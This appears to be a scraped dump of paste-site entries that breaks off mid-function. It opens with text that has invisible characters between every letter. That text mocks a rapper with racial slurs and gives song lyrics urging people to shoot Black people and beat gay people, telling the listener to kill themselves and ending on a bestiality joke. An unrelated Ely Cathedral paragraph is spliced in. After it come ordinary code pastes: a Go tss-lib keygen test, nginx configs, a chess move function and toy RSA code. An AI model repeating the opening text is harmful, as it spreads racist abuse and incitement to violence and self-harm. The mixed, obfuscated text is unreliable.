‎i‎s‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎k‎e‎e‎p‎ ‎t‎r‎a‎c‎k‎ ‎o‎f‎ ‎w‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎d‎u‎d‎e‎ ‎i‎s‎ ‎r‎e‎l‎e‎a‎s‎i‎n‎g‎,‎ ‎w‎i‎t‎h‎ ‎s‎o‎n‎g‎s‎ ‎e‎i‎t‎h‎e‎r‎ ‎b‎e‎i‎n‎g‎ ‎c‎h‎a‎n‎g‎e‎d‎ ‎i‎n‎ ‎p‎i‎t‎c‎h‎,‎ ‎s‎p‎e‎e‎d‎,‎ ‎o‎r‎ ‎t‎e‎m‎p‎o‎ ‎f‎o‎r‎ ‎i‎t‎ ‎n‎o‎t‎ ‎t‎o‎ ‎b‎e‎ ‎r‎e‎c‎o‎g‎n‎i‎z‎e‎d‎ ‎a‎s‎ ‎a‎ ‎d‎u‎p‎l‎i‎c‎a‎t‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎e‎r‎v‎i‎c‎e‎s‎ ‎h‎e‎ ‎p‎u‎t‎s‎ ‎h‎i‎s‎ ‎m‎u‎s‎i‎c‎ ‎o‎u‎t‎ ‎o‎n‎ ‎t‎o‎ ‎i‎n‎ ‎o‎r‎d‎e‎r‎ ‎t‎o‎ ‎g‎a‎i‎n‎ ‎a‎ ‎b‎u‎n‎c‎h‎ ‎o‎f‎ ‎m‎o‎n‎e‎y‎ ‎j‎u‎s‎t‎ ‎i‎n‎ ‎c‎a‎s‎e‎ ‎h‎i‎s‎ ‎c‎o‎m‎p‎a‎n‎y‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎w‎o‎r‎k‎ ‎o‎u‎t‎ ‎s‎o‎ ‎w‎e‎l‎l‎.‎

V‎i‎p‎e‎r‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎t‎i‎e‎s‎t‎ ‎a‎r‎t‎w‎o‎r‎k‎ ‎k‎n‎o‎w‎n‎ ‎t‎o‎ ‎m‎a‎n‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎m‎a‎d‎e‎ ‎f‎o‎r‎ ‎h‎i‎m‎ ‎b‎y‎ ‎o‎t‎h‎e‎r‎ ‎p‎e‎o‎p‎l‎e‎ ‎f‎o‎r‎ ‎l‎i‎t‎t‎l‎e‎ ‎t‎o‎ ‎n‎o‎ ‎c‎o‎s‎t‎ ‎i‎n‎ ‎j‎u‎s‎t‎ ‎a‎ ‎f‎e‎w‎ ‎s‎e‎c‎o‎n‎d‎s‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎a‎p‎p‎a‎r‎e‎n‎t‎l‎y‎ ‎p‎u‎t‎t‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎s‎t‎o‎c‎k‎ ‎o‎r‎ ‎e‎a‎s‎y‎-‎t‎o‎-‎g‎r‎a‎b‎ ‎f‎o‎n‎t‎ ‎o‎n‎ ‎t‎o‎p‎ ‎o‎f‎ ‎a‎ ‎p‎i‎c‎t‎u‎r‎e‎ ‎o‎f‎ ‎a‎ ‎w‎h‎o‎r‎e‎ ‎t‎h‎a‎t‎'‎s‎ ‎a‎l‎s‎o‎ ‎s‎t‎o‎c‎k‎ ‎o‎r‎ ‎a‎n‎ ‎e‎x‎p‎l‎o‎s‎i‎o‎n‎ ‎w‎i‎t‎h‎ ‎s‎o‎m‎e‎ ‎g‎r‎a‎y‎ ‎b‎a‎c‎k‎g‎r‎o‎u‎n‎d‎ ‎a‎s‎ ‎a‎ ‎b‎u‎n‎c‎h‎ ‎o‎f‎ ‎e‎m‎p‎t‎y‎ ‎s‎p‎a‎c‎e‎ ‎i‎s‎ ‎t‎o‎o‎ ‎t‎i‎m‎e‎ ‎c‎o‎n‎s‎u‎m‎i‎n‎g‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎e‎n‎t‎r‎e‎p‎r‎e‎n‎e‎u‎r‎,‎ ‎r‎a‎p‎p‎e‎r‎,‎ ‎p‎i‎a‎n‎i‎s‎t‎,‎ ‎d‎o‎c‎t‎o‎r‎,‎ ‎U‎.‎S‎.‎A‎.‎ ‎l‎i‎c‎e‎n‎s‎e‎d‎ ‎r‎e‎a‎l‎t‎o‎r‎,‎ ‎A‎l‎c‎o‎r‎ ‎l‎i‎f‎e‎ ‎e‎x‎t‎e‎n‎s‎i‎o‎n‎ ‎m‎e‎m‎b‎e‎r‎,‎ ‎a‎n‎d‎ ‎5‎-‎9‎ ‎P‎i‎r‎u‎ ‎m‎e‎m‎b‎e‎r‎.‎


(‎(‎ ‎T‎h‎i‎s‎ ‎C‎a‎t‎ ‎C‎a‎n‎'‎t‎ ‎E‎v‎e‎n‎ ‎S‎p‎e‎a‎k‎ ‎N‎i‎g‎g‎e‎r‎ ‎E‎n‎g‎l‎i‎s‎h‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

E‎v‎e‎r‎y‎ ‎d‎a‎y‎ ‎w‎h‎e‎n‎ ‎y‎o‎u‎'‎r‎e‎ ‎m‎a‎k‎i‎n‎g‎ ‎m‎o‎n‎k‎e‎y‎ ‎n‎o‎i‎s‎e‎s‎ ‎a‎t‎ ‎b‎l‎a‎c‎k‎s‎
A‎n‎d‎ ‎y‎o‎u‎ ‎t‎e‎l‎l‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎r‎e‎l‎a‎x‎
S‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎f‎a‎c‎e‎ ‎t‎h‎e‎ ‎f‎a‎c‎t‎s‎
A‎n‎d‎ ‎I‎ ‎s‎a‎y‎ ‎K‎
K‎!‎
W‎h‎a‎t‎ ‎a‎ ‎w‎o‎n‎d‎e‎r‎f‎u‎l‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎d‎a‎y‎
W‎h‎e‎r‎e‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎m‎a‎k‎e‎ ‎m‎o‎n‎k‎e‎y‎ ‎n‎o‎i‎s‎e‎s‎ ‎a‎t‎ ‎g‎a‎y‎s‎
A‎n‎d‎ ‎b‎e‎a‎t‎ ‎u‎p‎ ‎o‎n‎ ‎t‎h‎o‎s‎e‎ ‎d‎a‎m‎n‎ ‎n‎i‎g‎g‎e‎r‎s‎
Y‎o‎u‎ ‎g‎o‎t‎t‎a‎ ‎s‎h‎o‎o‎t‎ ‎t‎h‎e‎m‎ ‎i‎n‎ ‎t‎h‎e‎ ‎h‎e‎a‎r‎t‎
S‎h‎o‎o‎t‎ ‎t‎h‎e‎m‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎e‎e‎t‎
S‎h‎o‎o‎t‎ ‎u‎p‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎
T‎h‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎
S‎h‎o‎o‎t‎ ‎t‎h‎e‎m‎ ‎i‎n‎ ‎t‎h‎e‎ ‎e‎y‎e‎s‎
S‎h‎o‎o‎t‎ ‎u‎p‎ ‎t‎h‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎g‎e‎t‎ ‎t‎o‎g‎e‎t‎h‎e‎r‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎b‎e‎t‎t‎e‎r‎
B‎y‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎u‎p‎ ‎T‎r‎e‎v‎o‎r‎
M‎a‎k‎e‎ ‎s‎o‎m‎e‎ ‎s‎i‎m‎p‎l‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎
T‎h‎a‎t‎ ‎y‎o‎u‎'‎l‎l‎ ‎s‎t‎a‎b‎ ‎i‎n‎ ‎t‎h‎e‎ ‎h‎e‎a‎r‎t‎
O‎r‎ ‎g‎o‎ ‎k‎i‎l‎l‎ ‎y‎o‎u‎r‎s‎e‎l‎f‎ ‎(‎G‎o‎ ‎k‎i‎l‎l‎ ‎y‎o‎u‎r‎s‎e‎l‎f‎)‎
O‎r‎ ‎t‎h‎a‎t‎'‎s‎ ‎t‎h‎e‎ ‎p‎l‎a‎c‎e‎ ‎t‎o‎ ‎s‎t‎a‎r‎t‎
S‎t‎a‎r‎t‎ ‎t‎o‎ ‎r‎a‎g‎e‎ ‎a‎n‎d‎ ‎s‎a‎y‎ ‎K‎
K‎!‎
W‎h‎a‎t‎ ‎a‎ ‎w‎o‎n‎d‎e‎r‎f‎u‎l‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎d‎a‎y‎
W‎h‎e‎r‎e‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎m‎a‎k‎e‎ ‎m‎o‎n‎k‎e‎y‎ ‎n‎o‎i‎s‎e‎s‎ ‎a‎t‎ ‎g‎a‎y‎s‎
A‎n‎d‎ ‎b‎e‎a‎t‎ ‎u‎p‎ ‎o‎n‎ ‎t‎h‎o‎s‎e‎ ‎d‎a‎m‎n‎ ‎n‎i‎g‎g‎e‎r‎s‎
W‎h‎a‎t‎ ‎a‎ ‎w‎o‎n‎d‎e‎r‎f‎u‎l‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎d‎a‎y‎
K‎!‎
W‎h‎a‎t‎ ‎a‎ ‎w‎o‎n‎d‎e‎r‎f‎u‎l‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎d‎a‎y‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

E‎l‎y‎ ‎C‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎i‎s‎ ‎a‎n‎ ‎A‎n‎g‎l‎i‎c‎a‎n‎ ‎c‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎i‎t‎y‎ ‎o‎f‎ ‎E‎l‎y‎ ‎i‎n‎ ‎C‎a‎m‎b‎r‎i‎d‎g‎e‎s‎h‎i‎r‎e‎,‎ ‎E‎n‎g‎l‎a‎n‎d‎.‎ ‎T‎h‎e‎ ‎c‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎c‎a‎n‎ ‎t‎r‎a‎c‎e‎ ‎i‎t‎s‎ ‎o‎r‎i‎g‎i‎n‎ ‎t‎o‎ ‎a‎n‎ ‎a‎b‎b‎e‎y‎ ‎f‎o‎u‎n‎d‎e‎d‎ ‎i‎n‎ ‎E‎l‎y‎ ‎i‎n‎ ‎6‎7‎2‎ ‎b‎y‎ ‎S‎t‎ ‎Æ‎t‎h‎e‎l‎t‎h‎r‎y‎t‎h‎ ‎(‎a‎l‎s‎o‎ ‎c‎a‎l‎l‎e‎d‎ ‎E‎t‎h‎e‎l‎d‎r‎e‎d‎a‎)‎.‎ ‎T‎h‎e‎ ‎e‎a‎r‎l‎i‎e‎s‎t‎ ‎p‎a‎r‎t‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎p‎r‎e‎s‎e‎n‎t‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎d‎a‎t‎e‎ ‎t‎o‎ ‎1‎0‎8‎3‎,‎ ‎a‎n‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎g‎r‎a‎n‎t‎e‎d‎ ‎c‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎s‎t‎a‎t‎u‎s‎ ‎i‎n‎ ‎1‎1‎0‎9‎.‎ ‎U‎n‎t‎i‎l‎ ‎t‎h‎e‎ ‎R‎e‎f‎o‎r‎m‎a‎t‎i‎o‎n‎ ‎t‎h‎e‎ ‎c‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎w‎a‎s‎ ‎d‎e‎d‎i‎c‎a‎t‎e‎d‎ ‎t‎o‎ ‎S‎t‎ ‎E‎t‎h‎e‎l‎d‎r‎e‎d‎a‎ ‎a‎n‎d‎ ‎S‎t‎ ‎P‎e‎t‎e‎r‎,‎ ‎a‎t‎ ‎w‎h‎i‎c‎h‎ ‎p‎o‎i‎n‎t‎ ‎i‎t‎ ‎w‎a‎s‎ ‎r‎e‎f‎o‎u‎n‎d‎e‎d‎ ‎a‎s‎ ‎t‎h‎e‎ ‎C‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎C‎h‎u‎r‎c‎h‎ ‎o‎f‎ ‎t‎h‎e‎ ‎H‎o‎l‎y‎ ‎a‎n‎d‎ ‎U‎n‎d‎i‎v‎i‎d‎e‎d‎ ‎T‎r‎i‎n‎i‎t‎y‎ ‎o‎f‎ ‎E‎l‎y‎.‎ ‎I‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎c‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎D‎i‎o‎c‎e‎s‎e‎ ‎o‎f‎ ‎E‎l‎y‎ ‎a‎n‎d‎ ‎s‎e‎a‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎B‎i‎s‎h‎o‎p‎ ‎o‎f‎ ‎E‎l‎y‎.‎ ‎E‎l‎y‎ ‎C‎a‎t‎h‎e‎d‎r‎a‎l‎ ‎w‎a‎s‎ ‎b‎u‎i‎l‎t‎ ‎i‎n‎ ‎a‎ ‎m‎o‎n‎u‎m‎e‎n‎t‎a‎l‎ ‎R‎o‎m‎a‎n‎e‎s‎q‎u‎e‎ ‎s‎t‎y‎l‎e‎,‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎g‎a‎l‎i‎l‎e‎e‎ ‎p‎o‎r‎c‎h‎,‎ ‎l‎a‎d‎y‎ ‎c‎h‎a‎p‎e‎l‎ ‎a‎n‎d‎ ‎c‎h‎o‎i‎r‎ ‎l‎a‎t‎e‎r‎ ‎r‎e‎b‎u‎i‎l‎t‎ ‎i‎n‎ ‎a‎n‎ ‎e‎x‎u‎b‎e‎r‎a‎n‎t‎ ‎D‎e‎c‎o‎r‎a‎t‎e‎d‎ ‎G‎o‎t‎h‎i‎c‎.‎ ‎I‎t‎s‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎o‎c‎t‎a‎g‎o‎n‎a‎l‎ ‎t‎o‎w‎e‎r‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎W‎e‎s‎t‎ ‎T‎o‎w‎e‎r‎ ‎g‎i‎v‎e‎ ‎i‎t‎ ‎a‎ ‎p‎r‎o‎m‎i‎n‎e‎n‎t‎ ‎p‎o‎s‎i‎t‎i‎o‎n‎ ‎a‎b‎o‎v‎e‎ ‎t‎h‎e‎ ‎s‎u‎r‎r‎o‎u‎n‎d‎i‎n‎g‎ ‎f‎l‎a‎t‎ ‎l‎a‎n‎d‎s‎c‎a‎p‎e‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎t‎h‎e‎ ‎c‎a‎t‎h‎e‎d‎r‎a‎l‎'‎s‎ ‎l‎a‎d‎y‎ ‎c‎h‎a‎p‎e‎l‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎D‎a‎v‎i‎d‎ ‎I‎l‎i‎f‎f‎

.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎t‎o‎ ‎t‎h‎e‎ ‎a‎n‎i‎m‎a‎l‎ ‎s‎h‎e‎l‎t‎e‎r‎ ‎a‎n‎d‎ ‎g‎e‎t‎ ‎a‎ ‎p‎u‎p‎p‎y‎.‎ ‎N‎o‎w‎ ‎I‎ ‎h‎a‎v‎e‎ ‎a‎ ‎n‎e‎w‎ ‎s‎e‎x‎ ‎t‎o‎y‎.‎.‎.‎"
wWgGMJDu,tss-lib exp,ClickName,Go,Saturday 20th of January 2024 08:19:49 AM CDT,"package main

import (
	""crypto/rand""
	""fmt""
	""github.com/bnb-chain/tss-lib/v2/ecdsa/keygen""
	""github.com/bnb-chain/tss-lib/v2/tss""
	""github.com/ipfs/go-log""
	""math/big""
	""strconv""
	""sync""
	""time""
)

const N = 3
const TIMEOUT = time.Minute

func main() {
	Generate()
}

func Generate() {
	log.SetLogLevel(""tss-lib"", ""debug"")
	partiesID := getParty(N)
	outCh := make(chan tss.Message, len(partiesID))
	endCh := make(chan *keygen.LocalPartySaveData, len(partiesID))
	errChan := make(chan error, 1)

	sortedParties := tss.SortPartyIDs(partiesID)
	go func() {
		println(""sleeep"")
		time.Sleep(TIMEOUT)
		println(""awaaaaike"")
		errChan <- fmt.Errorf(""timeout expired"")
	}()
	ctx := tss.NewPeerContext(partiesID)
	var wg sync.WaitGroup
	keygenParties := make(map[int]tss.Party, N)
	for i := 0; i < N; i++ {
		wg.Add(1)
		localPartyID := sortedParties[i]
		params := tss.NewParameters(tss.S256(), ctx, localPartyID, len(sortedParties), 2)
		//preParams, _ := keygen.GeneratePreParams(1 * time.Minute)
		keyGenParty := keygen.NewLocalParty(params, outCh, endCh)
		keygenParties[i] = keyGenParty
		go func() {
			defer wg.Done()
			if err := keyGenParty.Start(); nil != err {
				errChan <- err
			}
		}()
	}

	for {
		println(""for"")
		stop := false
		select {
		case err := <-errChan:
			fmt.Println(err)
			stop = true
			break
		case msg := <-outCh:
			go func() {
				println(msg.String())
				data, _, err := msg.WireBytes()
				if err != nil {
					errChan <- err
					stop = true
				}
				println(""sending to friends"")
				for i := range sortedParties {
					//if msg.GetFrom().Index == partiesID[i].Index {
					//	println(""skip "", partiesID[i].Index)
					//	continue
					//}
					println(""send from"", msg.GetFrom().Index, "" to "", partiesID[i].Index)
					ok, err := keygenParties[i].UpdateFromBytes(data, msg.GetFrom(), true)
					if err != nil {
						errChan <- err
						break
					}
					if !ok {
						errChan <- fmt.Errorf(""not ok"")
						break
					}
					println(partiesID[i].Index, ""received message from "", msg.GetFrom().Index)
				}
			}()
		case data := <-endCh:
			println(""aha?"")
			fmt.Println(data)
			stop = true
		}
		if stop {
			break
		}
	}
	println(""out of for"")
}

func getParty(n int) (r []*tss.PartyID) {
	for i := 0; i < n; i++ {
		id := tss.NewPartyID(strconv.Itoa(i+1), ""monk"", randBigInt())
		r = append(r, id)
	}
	return r
}

func randBigInt() *big.Int {
	//Max random value, a 130-bits integer, i.e 2^130 - 1
	mx := new(big.Int)
	mx.Exp(big.NewInt(2), big.NewInt(130), nil).Sub(mx, big.NewInt(1))

	//Generate cryptographically strong pseudo-random between 0 - max
	n, err := rand.Int(rand.Reader, mx)
	if err != nil {
		panic(err)
	}

	return n
}
"
FJE3Hnkr,Tempo de execução de alocações em C/C++,jacknpoe,C++,Saturday 20th of January 2024 07:39:25 AM CDT,"#include <iostream>  // cout
#include <cstdlib>  // allocs
#include <time.h>  // clock
#include <locale>  // setlocale

#define ITERACOES 1000000

int main() {
	clock_t clock1, clock2;
	char *buffer1, *buffer2;

	std::cout.precision(4);
	setlocale( LC_ALL, """");		// caracteres acentuados

	std::cout << ""Resolução: "" << CLOCKS_PER_SEC << "" tiques por segundo."" << std::endl;

	clock1 = clock();
	for( int indice = 1; indice <= ITERACOES; indice++)
	{
		buffer1 = (char *) malloc( indice);
		buffer1[indice-1] = indice;
		buffer2 = (char *) malloc( indice);
		buffer2[indice-1] = indice;
		free( buffer1);
		free( buffer2);
	}
	clock2 = clock();

	std::cout << ""Malloc: "" << double( (clock2 - clock1 )) / CLOCKS_PER_SEC << ""s"" << std::endl;

	clock1 = clock();
	for( int indice = 1; indice <= ITERACOES; indice++)
	{
		buffer1 = (char *) calloc( indice, 1);
		buffer1[indice-1] = indice;
		buffer2 = (char *) calloc( indice, 1);
		buffer2[indice-1] = indice;
		free( buffer1);
		free( buffer2);
	}
	clock2 = clock();

	std::cout << ""Calloc: "" << double( ( clock2 - clock1 )) / CLOCKS_PER_SEC << ""s"" << std::endl;

	buffer1 = (char *) malloc( 1);
	buffer2 = (char *) malloc( 1);
	clock1 = clock();
	for( int indice = 1; indice <= ITERACOES; indice++)
	{
		buffer1 = (char *) realloc( buffer1, indice);
		buffer1[indice-1] = indice;
		buffer2 = (char *) realloc( buffer2, indice);
		buffer2[indice-1] = indice;
	}
	free( buffer1);
	free( buffer2);
	clock2 = clock();

	std::cout << ""Realloc: "" << double( (clock2 - clock1 )) / CLOCKS_PER_SEC << ""s"" << std::endl;
}"
RR888F52,vs16-dikom-a.ru,bender-nvkz,Nginx,Saturday 20th of January 2024 07:21:05 AM CDT,"upstream automationserver
{
	server 127.0.0.1:3004;
}

server {
    listen 80;
	listen 443 ssl;
	server_name dikom-a.com
                dikom-a.pro
            www.dikom-a.ru
            www.dikom-a.com
            www.dikom-a.pro;

    ssl_certificate *.pem;
    ssl_certificate_key *.pem;
    
    return 301 https://dikom-a.ru$request_uri;

    access_log off;
    error_log /srv/www/dikom-a.ru/logs/dikom-a.ru-err;
}

server
{
	listen 80;
	listen 443 ssl;
	server_name dikom-a.ru;

	if ($scheme = 'http')
	{
		rewrite ^(.*)$ https://$host$1 permanent;
	}

	ssl_certificate *.cert;
	ssl_certificate_key *.pem;

	access_log off;
	error_log /srv/www/dikom-a.ru/logs/dikom-a.ru-err;

	client_max_body_size 256m;

	set $root /srv/www/dikom.ru/htdocs/current/apps/automation;
	set $build $root/.next;

	error_page 500 502 503 504 /nginx_error_5xx.html;

	location = /nginx_error_5xx.html
	{
		root /srv/www/dikom.ru/htdocs/;
		internal;
	}

	location /
	{
		proxy_http_version 1.1;
		proxy_cache off;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_redirect off;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header X-Forwarded-Proto $scheme;
		proxy_read_timeout 1m;
		proxy_connect_timeout 1m;
		proxy_pass http://automationserver;
		proxy_set_header Proxy """";
	}

	location ^~ /_next/static/
	{
		alias $root/.next/static/;
		add_header Cache-Control ""public, max-age=3600, immutable"";
		try_files $uri $uri/ =404;
		access_log /srv/www/dikom-a.ru/logs/dikom-a.ru-static-acc main;
	}

	location /_next/image/
	{
		alias $build/static/;
		expires 1y;
		try_files $uri $uri/ =404;
	}

	location ~* \.(jpg|jpeg|gif|png|tif|tiff|bmp|svg|ico|js|css|zip|tgz|gz|tar|rar|bz2|rtf|doc|docx|xls|xlsx|ppt|pptx|exe|pdf|txt|mid|midi|swf|flv|avi|djvu|wav|mp3|ogg|mp4|mpg|mpeg|mov|wmv|wma|webm|ogv|ogg|3gp|otf|woff|woff2|eot|rar)$
	{
		expires 30d;
		access_log off;
		log_not_found off;
		root $root/public;
	}

	include vhost.inc.conf;
}
"
aL7D6sq8,Untitled,MikeWhitfordAuthor,GDScript,Saturday 20th of January 2024 07:15:55 AM CDT,"func rook_move(object, start_square, new_square):
	var start_xy = Global.label_to_xy(start_square.label)
	var new_xy = Global.label_to_xy(new_square.label)
	if new_xy.x != start_xy.x and new_xy.y != start_xy.y:
		return false
	if new_xy.y == start_xy.y:
		if new_xy.x > start_xy.x:
			for i in range(start_xy.x + 1, new_xy.x, 1):
				var square = Global.xy_to_square(Vector2i(i, start_xy.y))
				if square.occupied:
					if square.guest.colour != colour:
						return true
					else: 
						return false
		else:
			for i in range(new_xy.x - 1, start_xy.x, -1):
				var square = Global.xy_to_square(Vector2i(i, start_xy.y))
				if square.occupied:
					if square.guest.colour == colour:
						return false
					else: 
						return true
			return true
	elif new_xy.x == start_xy.x:
		if new_xy.y > start_xy.y:
			for i in range(start_xy.y + 1, new_xy.y, 1):
				var square = Global.xy_to_square(Vector2i(start_xy.x, i))
				if square.occupied:
					if square.guest.colour != colour:
						return true
					else: 
						return false
		else:
			for i in range(new_xy.y - 1, start_xy.y, -1):
				var square = Global.xy_to_square(Vector2i(start_xy.x, i))
				if square.occupied:
					if square.guest.colour == colour:
						return false
					else: 
						return true
			return true
	else:
		return false

----
# Global functions used above:

func label_to_xy(label: String):
	var out: Vector2i
	var files = {""A"": 1, ""B"": 2, ""C"": 3, ""D"": 4, ""E"": 5, ""F"": 6, ""G"": 7, ""H"": 8}
	var file = files[label[0]]
	var rank = int(label[1])
	out = Vector2i(file, rank)
	return out

func xy_to_square(xy: Vector2i):
	var label = xy_to_label(xy)
	var square = label_squareobj[label]
	return square

# The Squares class
extends Node2D
class_name squares
signal broadcast(ID: Object, label: String, occupied: bool)

@export var light: bool
var label: String
var occupied: bool
var guest: Object
var xy: Vector2i

func _ready():
	$Sprite2D.scale = Vector2i(70,70)
	if light: $Sprite2D.self_modulate = Color(0.98, 0.647, 0.455)
	else: $Sprite2D.self_modulate = Color(0.321, 0.175, 0.029)
	var Label = Label.new()
	Label.text = label
	if light: Label.self_modulate.a = 0.9
	else: Label.self_modulate.a = 0.5
	Label.horizontal_alignment = HORIZONTAL_ALIGNMENT_RIGHT
	Label.vertical_alignment = VERTICAL_ALIGNMENT_BOTTOM
	Label.position.x += 10
	Label.position.y += 10
	add_child(Label)
	emit_signal(""broadcast"", self, label, null)
"
2MuXLs5G,vs16-dobro.io,bender-nvkz,Nginx,Saturday 20th of January 2024 07:11:40 AM CDT,"upstream dobroserver
{
	server 127.0.0.1:3002;
}

server {
    listen 80;
	listen 443 ssl;
	server_name www.dobro.io;

    ssl_certificate *.pem;
    ssl_certificate_key *.pem;
    
    return 301 https://dobro.io$request_uri;

    access_log off;
    error_log /srv/www/dobro.io/logs/dobro.io-err;
}

server
{
	listen 80;
	listen 443 ssl;
	server_name dobro.io;

	if ($scheme = 'http')
	{
		rewrite ^(.*)$ https://$host$1 permanent;
	}

	ssl_certificate *.cert;
	ssl_certificate_key *.pem;

	access_log off;
	error_log /srv/www/dobro.io/logs/dobro.io-err;

	client_max_body_size 256m;

	set $root /srv/www/dikom.ru/htdocs/current/apps/dobro;
	set $build $root/.next;

	error_page 500 502 503 504 /nginx_error_5xx.html;

	location = /nginx_error_5xx.html
	{
		root /srv/www/dikom.ru/htdocs/;
		internal;
	}

	location /
	{
		proxy_http_version 1.1;
		proxy_cache off;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_redirect off;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header X-Forwarded-Proto $scheme;
		proxy_read_timeout 1m;
		proxy_connect_timeout 1m;
		proxy_pass http://dobroserver;
		proxy_set_header Proxy """";
	}

	location ^~ /_next/static/
	{
		alias $root/.next/static/;
		add_header Cache-Control ""public, max-age=3600, immutable"";
		try_files $uri $uri/ =404;
		access_log /srv/www/dobro.io/logs/dobro.io-static-acc main;
	}

	location /_next/image/
	{
		alias $build/static/;
		expires 1y;
		try_files $uri $uri/ =404;
	}

	location ~* \.(jpg|jpeg|gif|png|tif|tiff|bmp|svg|ico|js|css|zip|tgz|gz|tar|rar|bz2|rtf|doc|docx|xls|xlsx|ppt|pptx|exe|pdf|txt|mid|midi|swf|flv|avi|djvu|wav|mp3|ogg|mp4|mpg|mpeg|mov|wmv|wma|webm|ogv|ogg|3gp|otf|woff|woff2|eot|rar)$
	{
		expires 30d;
		access_log off;
		log_not_found off;
		root $root/public;
	}

	include vhost.inc.conf;
}
"
hZQbABev,Untitled,prog3r,C++,Saturday 20th of January 2024 06:20:06 AM CDT,"#include <cctype>
#include <cerrno>
#include <cfloat>
#include <ciso646>
#include <climits>
#include <clocale>
#include <cmath>
#include <csetjmp>
#include <csignal>
#include <cstdarg>
#include <cstddef>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <ccomplex>
#include <cfenv>
#include <cinttypes>
#include <cstdbool>
#include <cstdint>
#include <ctgmath>
#include <cwchar>
#include <cwctype>
#include <exception>
#include <stdexcept>
#include <algorithm>
#include <bitset>
#include <complex>
#include <deque>
#include <exception>
#include <fstream>
#include <functional>
#include <iomanip>
#include <ios>
#include <iosfwd>
#include <iostream>
#include <istream>
#include <iterator>
#include <limits>
#include <list>
#include <locale>
#include <map>
#include <memory>
#include <new>
#include <numeric>
#include <ostream>
#include <queue>
#include <set>
#include <sstream>
#include <stack>
#include <stdexcept>
#include <streambuf>
#include <string>
#include <typeinfo>
#include <utility>
#include <valarray>
#include <vector>
#include <array>
#include <atomic>
#include <chrono>
#include <condition_variable>
#include <forward_list>
#include <future>
#include <initializer_list>
#include <mutex>
#include <random>
#include <ratio>
#include <regex>
#include <scoped_allocator>
#include <system_error>
#include <thread>
#include <tuple>
#include <typeindex>
#include <type_traits>
#include <unordered_map>
#include <unordered_set>
using namespace std;

using ll = long long;

void encrypt(ll e, ll secret, ll N) {
    ll res = 1;
    while (e--) {
        res = res*secret%N;
    }
    cout << ""Шифр: <"" << res << "">\n"";
}

void decrypt(ll d, ll open, ll N) {
    ll res = 1;
    while (d--) {
        res = res*open%N;
    }
    cout << ""Ответ: <"" << res << "">\n"";
}

void find_d(ll e, ll phi) {
    cout << ""e = "" << e << "", φ = "" << phi << ""\n"";
    while (e != 1) {
        ll ost = phi%e;
        ll c = phi/e;
        if (ost==1) {
            cout << ""Начинай с "" << ost << ""="" << phi << ""-"" << e << ""*"" << c << ""\n"";
        }
        else {
